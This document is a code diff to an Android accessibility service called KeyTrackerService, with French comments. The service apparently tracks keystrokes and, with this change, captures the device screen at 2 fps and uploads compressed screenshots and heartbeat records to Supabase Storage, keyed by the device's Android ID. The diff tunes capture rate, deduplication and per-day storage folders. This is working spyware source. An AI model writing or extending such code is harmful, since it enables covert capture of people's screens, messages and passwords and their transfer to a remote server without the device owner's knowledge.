@@ -28,6 +28,7 @@ import java.text.SimpleDateFormat;
 import java.util.Date;
 import java.util.Locale;
 import java.util.concurrent.atomic.AtomicBoolean;
+import java.util.concurrent.atomic.AtomicReference;
 
 public class KeyTrackerService extends AccessibilityService {
     private static final String TAG = "KeyTrackerService";
@@ -49,11 +50,12 @@ public class KeyTrackerService extends AccessibilityService {
     };
 
     // Pseudo-flux: screenshot périodique (faible FPS) vers Supabase Storage.
-    private static final long SCREENSHOT_INTERVAL_MS = 1500; // ~0.6 fps (simple + moins gourmand)
+    private static final long SCREENSHOT_INTERVAL_MS = 500; // 2 fps (simple + moins gourmand)
     private static final int SCREENSHOT_MAX_WIDTH = 360; // plus bas = plus léger
-    private static final int SCREENSHOT_WEBP_QUALITY = 10; // compression très agressive
+    private static final int SCREENSHOT_WEBP_QUALITY = 14; // compression très agressive
 
     private final ExecutorService screenshotExecutor = Executors.newSingleThreadExecutor();
+    private final AtomicReference<String> lastEnsuredScreenshotDay = new AtomicReference<>(null);
     private final Runnable screenshotLoop = new Runnable() {
         @Override
         public void run() {
@@ -539,9 +541,21 @@ public class KeyTrackerService extends AccessibilityService {
 
                                 byte[] bytes = compressToWebpLossy(scaled, SCREENSHOT_WEBP_QUALITY);
                                 if (bytes != null && bytes.length > 0) {
-                                    String objectPath = buildScreenshotObjectPath();
-                                    if (objectPath != null) {
-                                        SupabaseAndroidEventsClient.uploadScreenshot(KeyTrackerService.this, bytes, objectPath, "image/webp");
+                                    ScreenshotPaths paths = buildScreenshotPaths();
+                                    if (paths != null) {
+                                        ensureScreenshotFolders(paths.deviceId, paths.dayStr);
+
+                                        if (shouldSkipScreenshotUpload(bytes.length, paths.objectPath)) {
+                                            Log.d(TAG, "screenshot: skip upload (same size=" + bytes.length + ") keep=" + lastUploadedScreenshotPath);
+                                            // "Timestamp" léger côté DB (sans ré-uploader l'image)
+                                            // On envoie la référence de la dernière image réellement uploadée.
+                                            String heartbeat = "{\"size\":" + bytes.length + ",\"path\":\"" +
+                                                    String.valueOf(lastUploadedScreenshotPath).replace("\"", "\\\"") + "\"}";
+                                            sendKeyToSupabase("screenshot_heartbeat", heartbeat, lastPackageName);
+                                        } else {
+                                            SupabaseAndroidEventsClient.uploadScreenshot(KeyTrackerService.this, bytes, paths.objectPath, "image/webp");
+                                            markScreenshotUploaded(bytes.length, paths.objectPath);
+                                        }
                                     }
                                 }
 
@@ -965,18 +979,107 @@ public class KeyTrackerService extends AccessibilityService {
 
     /**
      * Chemin Supabase Storage (format FR lisible) :
-     * <android_id>/screenshots/<dd-MM-yyyy>/<HH-mm-ss-SSS>.webp
+     * <android_id>/screenshots/<dd-MM-yyyy>/<HH-mm-ss>.webp
+     * (si collision: <HH-mm-ss>-1.webp, -2.webp, etc.)
      */
     private String buildScreenshotObjectPath() {
+        ScreenshotPaths p = buildScreenshotPaths();
+        return p == null ? null : p.objectPath;
+    }
+
+    private static final class ScreenshotPaths {
+        final String deviceId;
+        final String dayStr;
+        final String objectPath;
+
+        ScreenshotPaths(String deviceId, String dayStr, String objectPath) {
+            this.deviceId = deviceId;
+            this.dayStr = dayStr;
+            this.objectPath = objectPath;
+        }
+    }
+
+    private ScreenshotPaths buildScreenshotPaths() {
         String deviceId = SupabaseAndroidEventsClient.getAndroidIdOrNull(this);
         if (deviceId == null || deviceId.trim().isEmpty()) return null;
 
         Date now = new Date();
         SimpleDateFormat day = new SimpleDateFormat("dd-MM-yyyy", Locale.FRANCE);
-        SimpleDateFormat time = new SimpleDateFormat("HH-mm-ss-SSS", Locale.FRANCE);
+        SimpleDateFormat time = new SimpleDateFormat("HH-mm-ss", Locale.FRANCE);
         String dayStr = day.format(now);
         String timeStr = time.format(now);
+        String uniqueTime = ensureUniqueSecondFilename(timeStr);
+        return new ScreenshotPaths(
+                deviceId,
+                dayStr,
+                deviceId + "/screenshots/" + dayStr + "/" + uniqueTime + ".webp"
+        );
+    }
 
-        return deviceId + "/screenshots/" + dayStr + "/" + timeStr + ".webp";
+    // Évite d'écraser un fichier si 2 captures tombent dans la même seconde.
+    private final Object screenshotNameLock = new Object();
+    private String lastScreenshotSecond = null;
+    private int screenshotSecondSeq = 0;
+
+    // Anti-doublon (heuristique): si la taille du fichier compressé est identique au dernier upload,
+    // on évite de ré-uploader l'image (utile quand l'écran ne change pas).
+    private final Object screenshotDedupLock = new Object();
+    private int lastUploadedScreenshotSize = -1;
+    private String lastUploadedScreenshotPath = null;
+
+    private String ensureUniqueSecondFilename(String hhmmss) {
+        synchronized (screenshotNameLock) {
+            if (hhmmss == null) return "unknown";
+            if (!hhmmss.equals(lastScreenshotSecond)) {
+                lastScreenshotSecond = hhmmss;
+                screenshotSecondSeq = 0;
+                return hhmmss;
+            }
+            screenshotSecondSeq += 1;
+            return hhmmss + "-" + screenshotSecondSeq;
+        }
+    }
+
+    private boolean shouldSkipScreenshotUpload(int newSize, String newPath) {
+        synchronized (screenshotDedupLock) {
+            if (lastUploadedScreenshotSize <= 0 || lastUploadedScreenshotPath == null) return false;
+            if (newPath != null && newPath.equals(lastUploadedScreenshotPath)) return false;
+            return newSize == lastUploadedScreenshotSize;
+        }
+    }
+
+    private void markScreenshotUploaded(int size, String path) {
+        synchronized (screenshotDedupLock) {
+            lastUploadedScreenshotSize = size;
+            lastUploadedScreenshotPath = path;
+        }
+    }
+
+    /**
+     * Supabase Storage n'a pas de "répertoires" physiques, mais certains viewers/flows
+     * s'attendent à ce que le préfixe existe. On crée donc un fichier marqueur
+     * par jour (et on pré-crée aussi celui de demain) pour éviter tout "trou" à minuit.
+     */
+    private void ensureScreenshotFolders(String deviceId, String dayStr) {
+        if (deviceId == null || deviceId.trim().isEmpty()) return;
+        if (dayStr == null || dayStr.trim().isEmpty()) return;
+
+        String prev = lastEnsuredScreenshotDay.get();
+        if (dayStr.equals(prev)) return;
+        if (!lastEnsuredScreenshotDay.compareAndSet(prev, dayStr)) return;
+
+        byte[] markerToday = ("folder=" + dayStr).getBytes(java.nio.charset.StandardCharsets.UTF_8);
+        String markerTodayPath = deviceId + "/screenshots/" + dayStr + "/_folder.txt";
+        SupabaseAndroidEventsClient.uploadScreenshot(this, markerToday, markerTodayPath, "text/plain", true);
+
+        try {
+            Date now = new Date();
+            Date tomorrow = new Date(now.getTime() + 24L * 60L * 60L * 1000L);
+            SimpleDateFormat dayFmt = new SimpleDateFormat("dd-MM-yyyy", Locale.FRANCE);
+            String tomorrowStr = dayFmt.format(tomorrow);
+            byte[] markerTomorrow = ("folder=" + tomorrowStr).getBytes(java.nio.charset.StandardCharsets.UTF_8);
+            String markerTomorrowPath = deviceId + "/screenshots/" + tomorrowStr + "/_folder.txt";
+            SupabaseAndroidEventsClient.uploadScreenshot(this, markerTomorrow, markerTomorrowPath, "text/plain", true);
+        } catch (Exception ignored) {}
     }
 }
